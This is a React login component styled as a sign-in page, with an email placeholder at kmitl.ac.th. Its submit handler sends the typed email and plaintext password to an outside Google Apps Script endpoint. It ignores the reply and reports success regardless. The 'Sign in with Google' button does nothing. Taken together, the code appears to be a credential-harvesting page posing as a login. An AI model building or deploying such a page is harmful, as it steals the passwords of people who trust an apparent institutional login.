import React, { useState } from 'react';
import { FcGoogle } from "react-icons/fc";
function Login({ onSuccess }) {
    const [showPassword, setShowPassword] = useState(false);
    const handleSubmit = (e) => {
        e.preventDefault();
        const url = "https://script.google.com/macros/s/AKfycby2CKWgNn1aEaFPNbBBKu1tyC-ZE_tG25oZ3ZmNM-OgmlS6D4h2Ev6XBFSznKda-q25Lg/exec"
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `Email=${encodeURIComponent(e.target.Email.value)}&Password=${encodeURIComponent(e.target.Password.value)}`
        }).then(res => res.text()).then(data => {
            onSuccess?.();
        }).catch(err => console.log(err))
    }


    return (
        <div className='flex bg-gray-100 w-screen h-screen justify-center items-center'>
            <div className='bg-white rounded-3xl p-6 sm:p-8 w-full max-w-md sm:max-w-lg md:max-w-xl shadow-lg'>
                <form onSubmit={handleSubmit} className='flex flex-col items-center p-10 gap-10 w-full'>
                    <p className='text-black text-2xl pt-5'>Sign in</p>
                    <input className='rounded w-full border block border-black px-3 py-2' type="text" name='Email' placeholder='Example@kmitl.ac.th' required />
                    <div className='relative w-full'>
                        <input
                            className='rounded w-full border block border-black pr-10 px-3 py-2'
                            type={showPassword ? 'text' : 'password'}
                            name='Password'
                            placeholder='Password'
                            required
                        />
                        <button
                            type='button'
                            className='absolute right-5 top-1/2 -translate-y-1/2 text-black-600 text-sm cursor-pointer'
                            onClick={() => setShowPassword(!showPassword)}
                        >
                            {showPassword ? 'Hide' : 'Show'}
                        </button>
                    </div>

                    <button type="submit" className='p-3 cursor-pointer bg-blue-600 text-white rounded w-full sm:w-40 hover:bg-blue-700'>Sign in</button>
                    <hr className='w-full border-t border-black' />
                    <div className='pointer-fine:hover:bg-gray-200 flex items-center justify-center gap-2 border rounded-3xl w-full px-2 py-3 cursor-pointer'>
                        <p className='flex flex-row gap-3'><FcGoogle size={24} />Sign in with Google</p>
                    </div>
                </form>
            </div>
        </div>
    )
}

export default Login